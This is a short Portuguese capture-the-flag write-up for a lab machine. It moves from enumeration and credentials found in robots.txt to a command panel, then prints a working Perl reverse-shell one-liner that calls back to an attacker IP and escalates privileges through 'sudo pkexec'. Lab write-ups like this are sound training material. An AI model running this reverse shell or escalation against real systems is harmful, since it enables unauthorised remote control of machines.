Enumeração de serviços:
![[Pasted image 20240203150806.png]]
Listagem de diretórios e arquivos:
![[Pasted image 20240203152423.png]]
Descoberta de usuário no código fonte:
![[Pasted image 20240203152531.png]]
Descoberta da senha em `/robots.txt`:
![[Pasted image 20240203153148.png]]
Login no painel em `/login.php`:
`R1ckRul3s:Wubbalubbadubdub`

Uma caixa com execução de comandos é exibida após o login. Alguns comandos foram desativados pelo sistema.
Vamos utilizar shell reversa em Perl:
```bash
perl -e 'use Socket;$i="10.9.58.140";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

Estamos no alvo:
![[Pasted image 20240203160512.png]]
Analisando os binários e SUID do usuário, podemos perceber que o mesmo tem permissão para executar qualquer binário com sudo e temos também o binário pkexec. Vamos então escalar o privilégio com o comando `sudo pkexec /bin/sh`:

![[Pasted image 20240203161334.png]]